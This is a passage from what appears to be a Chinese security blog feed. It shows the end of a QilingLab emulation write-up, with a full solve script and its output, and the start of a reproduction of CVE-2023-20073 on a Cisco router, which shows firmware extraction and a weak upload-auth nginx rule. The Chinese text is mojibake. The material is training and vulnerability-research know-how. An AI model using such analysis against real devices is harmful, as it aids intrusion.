i; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !buf[i] )</span><br><span class="line">          buf[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      buf[v4] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;qilinglab&quot;</span>) )</span><br><span class="line">        *a1 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æƒ³æ³•å°±æ˜¯hookæ‰strcmpï¼Œä½†æ˜¯ä¸Šä¸ªchallengeå·²ç»æˆåŠŸhookæ‰strcmpäº†ï¼Œå› æ­¤å°±åŠ«æŒcmdlineæˆä¸€ä¸ªç»“æ„ä½“ï¼Œç›´æ¥è¿”å›qilinglabå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FakeCmdline</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;qilinglab&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge10</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&quot;/proc/self/cmdline&quot;</span>,FakeCmdline)</span><br></pre></td></tr></table></figure><h3 id="challenge11"><a href="#challenge11" class="headerlink" title="challenge11"></a>challenge11</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001195 89 75 D0                      mov     [rbp+var_30], esi</span><br><span class="line">.text:0000000000001198 89 4D CC                      mov     [rbp+var_34], ecx</span><br><span class="line">.text:000000000000119B 89 45 D4                      mov     [rbp+var_2C], eax</span><br><span class="line">.text:000000000000119E 81 7D D0 51 69 6C 69          cmp     [rbp+var_30], 696C6951h</span><br><span class="line">.text:00000000000011A5 75 19                         jnz     short loc_11C0</span><br><span class="line">.text:00000000000011A5</span><br><span class="line">.text:00000000000011A7 81 7D CC 6E 67 4C 61          cmp     [rbp+var_34], 614C676Eh</span><br><span class="line">.text:00000000000011AE 75 10                         jnz     short loc_11C0</span><br><span class="line">.text:00000000000011AE</span><br><span class="line">.text:00000000000011B0 81 7D D4 62 20 20 20          cmp     [rbp+var_2C], 20202062h</span><br><span class="line">.text:00000000000011B7 75 07                         jnz     short loc_11C0</span><br><span class="line">.text:00000000000011B7</span><br><span class="line">.text:00000000000011B9 48 8B 45 B8                   mov     rax, [rbp+var_48]</span><br><span class="line">.text:00000000000011BD C6 00 01                      mov     byte ptr [rax], 1</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è®©esi&#x3D;&#x3D;696C6951h &amp;&amp; ecx&#x3D;&#x3D;614C676Eh &amp;&amp; eax&#x3D;20202062hï¼Œå°±å¯ä»¥è§£å†³äº†ï¼Œæ‰€ä»¥ç›´æ¥hookæ‰1195ï¼Œä½¿å¾—è¿™äº›å¯„å­˜å™¨ä¸ºç›¸åº”çš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_regs</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;esi&quot;</span>,<span class="number">0x696C6951</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;ecx&quot;</span>,<span class="number">0x614C676E</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;eax&quot;</span>,<span class="number">0x20202062</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(set_regs, base+<span class="number">0x1195</span>)</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤ä¾¿è§£å†³äº†æ‰€æœ‰çš„æŒ‘æˆ˜</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge1</span>(<span class="params">ql</span>):</span><br><span class="line">ql.mem.<span class="built_in">map</span>(<span class="number">0x1337</span>//<span class="number">4096</span>*<span class="number">4096</span> , <span class="number">0x1000</span>)</span><br><span class="line">ql.mem.write(<span class="number">0x1337</span>, <span class="string">b&quot;\x39\x05&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_uname_ret</span>(<span class="params">ql ,*args</span>): </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct utsname</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        char sysname[65];</span></span><br><span class="line"><span class="string">        char nodename[65];</span></span><br><span class="line"><span class="string">        char release[65];</span></span><br><span class="line"><span class="string">        char version[65];</span></span><br><span class="line"><span class="string">        char machine[65];</span></span><br><span class="line"><span class="string">        char domainname[65];</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rdi_value=ql.arch.regs.read(<span class="string">&quot;rdi&quot;</span>)</span><br><span class="line">ql.mem.write(rdi_value,<span class="string">b&#x27;QilingOS\x00&#x27;</span>)</span><br><span class="line">ql.mem.write(rdi_value+<span class="number">65</span>*<span class="number">3</span>,<span class="string">b&#x27;ChallengeStart\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge2</span>(<span class="params">ql</span>):</span><br><span class="line">ql.os.set_syscall(<span class="string">&quot;uname&quot;</span>,my_uname_ret,QL_INTERCEPT.EXIT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">if</span> size==<span class="number">0x20</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x02&quot;</span>*<span class="number">32</span></span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_getrandom_func</span>(<span class="params">ql, buf, count:<span class="built_in">int</span>, flag:<span class="built_in">int</span></span>) -&gt;<span class="built_in">int</span>:</span><br><span class="line">ql.mem.write(buf,<span class="string">b&#x27;\x02&#x27;</span>*count)</span><br><span class="line"><span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&#x27;/dev/urandom&#x27;</span>, FakeUrandom())</span><br><span class="line">ql.os.set_syscall(<span class="string">&quot;getrandom&quot;</span>,my_getrandom_func,QL_INTERCEPT.CALL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_1</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_1,base_addr+<span class="number">0x0E43</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_rets</span>(<span class="params">ql ,*args</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">win</span>(<span class="params">ql: Qiling</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] win&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge5</span>(<span class="params">ql</span>):</span><br><span class="line">ql.os.set_api(<span class="string">&#x27;rand&#x27;</span>, rand_rets)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rax_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line">ql.hook_address(write_rax_0,base_addr+<span class="number">0xF16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_rdi_0</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rdi&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sleep</span>(<span class="params">ql,*args</span>):</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge7</span>(<span class="params">ql</span>):</span><br><span class="line">base_addr = ql.mem.get_lib_base(ql.path)</span><br><span class="line"><span class="keyword">if</span> base_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;base_addr is not set correctly&quot;</span>)</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;sleep&#x27;, my_sleep)</span></span><br><span class="line">ql.hook_address(write_rdi_0,base_addr+<span class="number">0x00F3C</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_mem</span>(<span class="params">ql</span>):</span><br><span class="line">MAGIC=<span class="number">0x3DFCD6EA00000539</span></span><br><span class="line">struct_address = ql.mem.search(p64(MAGIC))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> struct_address <span class="keyword">or</span> <span class="built_in">len</span>(struct_address) &lt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;struct_address is not properly initialized&quot;</span>)</span><br><span class="line">mem_value1, mem_value2 ,mem_value3 = struct.unpack(<span class="string">&quot;QQQ&quot;</span>, ql.mem.read(struct_address[<span class="number">0</span>]-<span class="number">8</span>,<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug1&quot;</span>,<span class="built_in">hex</span>(mem_value1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug2&quot;</span>,<span class="built_in">hex</span>(mem_value2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] debug3&quot;</span>,<span class="built_in">hex</span>(mem_value3))</span><br><span class="line">ql.mem.write(mem_value3, <span class="string">b&quot;\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge8</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(search_mem, base+<span class="number">0xFB5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_strcmp</span>(<span class="params">ql,*args</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;rax&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_lower</span>(<span class="params">ql,*args</span>):</span><br><span class="line">ql.arch.regs.rax = ql.arch.regs.rdi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge9</span>(<span class="params">ql</span>):</span><br><span class="line"><span class="comment">#ql.os.set_api(&#x27;strcmp&#x27;, my_strcmp,QL_INTERCEPT.EXIT)</span></span><br><span class="line">ql.os.set_api(<span class="string">&#x27;tolower&#x27;</span>, my_lower,QL_INTERCEPT.EXIT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeCmdline</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;qilinglab&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge10</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&quot;/proc/self/cmdline&quot;</span>,FakeCmdline)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_regs</span>(<span class="params">ql</span>):</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;esi&quot;</span>,<span class="number">0x696C6951</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;ecx&quot;</span>,<span class="number">0x614C676E</span>)</span><br><span class="line">ql.arch.regs.write(<span class="string">&quot;eax&quot;</span>,<span class="number">0x20202062</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge11</span>(<span class="params">ql</span>):</span><br><span class="line">base = ql.mem.get_lib_base(ql.path)</span><br><span class="line">ql.hook_address(set_regs, base+<span class="number">0x1195</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">ql = Qiling([<span class="string">r&quot;qilinglab-x86_64&quot;</span>], <span class="string">r&#x27;./qiling/examples/rootfs/x8664_linux&#x27;</span>, verbose=QL_VERBOSE.OFF)</span><br><span class="line"><span class="comment">#ql.verbose = 0</span></span><br><span class="line"><span class="comment">#ql.debugger = &quot;gdb:0.0.0.0:9999&quot;</span></span><br><span class="line"><span class="comment">#base_addr = ql.mem.get_lib_base(ql.path)</span></span><br><span class="line"><span class="comment">#ql.hook_address(win, base_addr + 0x12C5) </span></span><br><span class="line">challenge1(ql)</span><br><span class="line">challenge2(ql)</span><br><span class="line">challenge3(ql)</span><br><span class="line">challenge4(ql)</span><br><span class="line">challenge5(ql)</span><br><span class="line">challenge6(ql)</span><br><span class="line">challenge7(ql)</span><br><span class="line">challenge8(ql)</span><br><span class="line">challenge9(ql)</span><br><span class="line">challenge10(ql)</span><br><span class="line">challenge11(ql)</span><br><span class="line">ql.run()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">s1nec-1o@s1nec1o:~/Qiling$ python3 solve.py </span><br><span class="line">Welcome to QilingLab.</span><br><span class="line">Here is the list of challenges:</span><br><span class="line">Challenge 1: Store 1337 at pointer 0x1337.</span><br><span class="line">Challenge 2: Make the &#x27;uname&#x27; syscall return the correct values.</span><br><span class="line">Challenge 3: Make &#x27;/dev/urandom&#x27; and &#x27;getrandom&#x27; &quot;collide&quot;.</span><br><span class="line">Challenge 4: Enter inside the &quot;forbidden&quot; loop.</span><br><span class="line">Challenge 5: Guess every call to rand().</span><br><span class="line">Challenge 6: Avoid the infinite loop.</span><br><span class="line">Challenge 7: Don&#x27;t waste time waiting for &#x27;sleep&#x27;.</span><br><span class="line">Challenge 8: Unpack the struct and write at the target address.</span><br><span class="line">Challenge 9: Fix some string operation to make the iMpOsSiBlE come true.</span><br><span class="line">Challenge 10: Fake the &#x27;cmdline&#x27; line file to return the right content.</span><br><span class="line">Challenge 11: Bypass CPUID/MIDR_EL1 checks.</span><br><span class="line"></span><br><span class="line">Checking which challenge are solved...</span><br><span class="line">Note: Some challenges will results in segfaults and infinite loops if they aren&#x27;t solved.</span><br><span class="line"></span><br><span class="line">Challenge 1: SOLVED</span><br><span class="line">Challenge 2: SOLVED</span><br><span class="line">Challenge 3: SOLVED</span><br><span class="line">Challenge 4: SOLVED</span><br><span class="line">Challenge 5: SOLVED</span><br><span class="line">Challenge 6: SOLVED</span><br><span class="line">[*] debug1 0x55555575a690</span><br><span class="line">[*] debug2 0x3dfcd6ea00000539</span><br><span class="line">[*] debug3 0x80000000dd54</span><br><span class="line">Challenge 7: SOLVED</span><br><span class="line">Challenge 8: SOLVED</span><br><span class="line">Challenge 9: SOLVED</span><br><span class="line">Challenge 10: SOLVED</span><br><span class="line">Challenge 11: SOLVED</span><br><span class="line">You solved 11/11 of the challenges</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åšå®Œè¿™äº›labï¼Œå¯¹qilingçš„ä½œç”¨ï¼Œè¿™ä¸ªframeworkçš„ç†è§£ï¼Œæ›´åŠ çš„æ·±ï¼Œå¸Œæœ›çœ‹åˆ°è¿™é‡Œçš„è¯»è€…å¯ä»¥è‡ªå·±å»åšä¸€éï¼Œä¸è¦çº¯çœ‹ä»–äººçš„wpï¼Œå› ä¸ºæ¯</summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Qiling" scheme="http://s1nec-1o.github.io/tags/Qiling/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-20073å¤ç°</title>
    <link href="http://s1nec-1o.github.io/2024/08/11/CVE-2023-20073%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/08/11/CVE-2023-20073%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-08-11T15:30:17.000Z</published>
    <updated>2024-08-11T15:32:00.590Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-20073"><a href="#CVE-2023-20073" class="headerlink" title="CVE-2023-20073"></a>CVE-2023-20073</h1><h1 id="æå–å›ºä»¶"><a href="#æå–å›ºä»¶" class="headerlink" title="æå–å›ºä»¶"></a>æå–å›ºä»¶</h1><p>é¦–å…ˆåœ¨å®˜ç½‘ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„<a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29">å›ºä»¶</a>ï¼Œä¹‹åbinwalk -Meè§£å‹ï¼Œä½†æ˜¯ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œä¾¿æ˜¯å› ä¸ºå…¶è½¯è¿æ¥æŒ‡å‘çš„æ˜¯ä»–çš„æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹çš„ï¼Œè€Œå½“å‰æ ¹ç›®å½•æ˜¯æˆ‘ä»¬çš„ä¸»æœºï¼Œæƒ³æ¥ä¹Ÿä¸ä¼šè®©å…¶éšä¾¿çš„å»ºç«‹è½¯è¿æ¥ï¼Œä»–åˆåªæ˜¯ä¸€ä¸ªæœºå™¨ï¼Œå› æ­¤æ— æ³•è‡ªå·±æŒ‡å‘è‡ªå·±çš„æ ¹ç›®å½•ä¸‹ï¼Œé‚£æˆ‘ä»¬åªå¥½å†æ¬¡è‡ªå·±å»è§£å‹</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331139.png" alt="image-20240811213143133"></p><p>åœ¨è¿™ä¸ªç›®å½•ä¸‹æ‰§è¡Œ <code>ubi_reader 0.ubi</code>ï¼Œä½†æ˜¯æˆ‘æœ¬èº«æ‹¥æœ‰è¿™ä¸ªubi_readerï¼Œæ˜¯ä»binwalkæºç ä¸‹è½½çš„ï¼Œä»–è‡ªå·±å´ä¸èƒ½ä¸€æ¬¡binwalkè§£å‹æˆåŠŸï¼Œç¡®å®è®©äººåŒªå¤·æ‰€æ€ï¼Œå¯èƒ½æ˜¯è¦å¤šåŠ ä¸€äº›ä»€ä¹ˆå‚æ•°å§</p><h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><h2 id="é…ç½®æ–‡ä»¶åˆ†æ"><a href="#é…ç½®æ–‡ä»¶åˆ†æ" class="headerlink" title="é…ç½®æ–‡ä»¶åˆ†æ"></a>é…ç½®æ–‡ä»¶åˆ†æ</h2><p>é¦–å…ˆåœ¨&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;ç›®å½•ä¸‹æœ‰å¾ˆå¤šnginxçš„é…ç½®æ¨¡å—</p><p>é¦–å…ˆçœ‹&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;rest.url.conf</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331141.png" alt="image-20240811131431353"></p><p>çœ‹åˆ°å®ƒåˆ†ä¸ºäº”ä¸ªæ¨¡å—ï¼Œå…¶ä¸­ä¸»è¦çœ‹ç¬¬ä¸‰ä¸ªæ¨¡å—ï¼Œå³æ–‡ä»¶ä¸Šä¼ æ¨¡å—</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">location /api/operations/ciscosb-file:form-file-upload &#123;</span><br><span class="line">set $deny <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">if ($http_authorization != &quot;&quot;) &#123;</span><br><span class="line">set $deny &quot;<span class="number">0</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($deny = &quot;<span class="number">1</span>&quot;) &#123;</span><br><span class="line">return <span class="number">403</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload_pass /<span class="selector-tag">form</span>-file-upload;</span><br><span class="line">upload_store /tmp/upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name<span class="selector-class">.name</span> 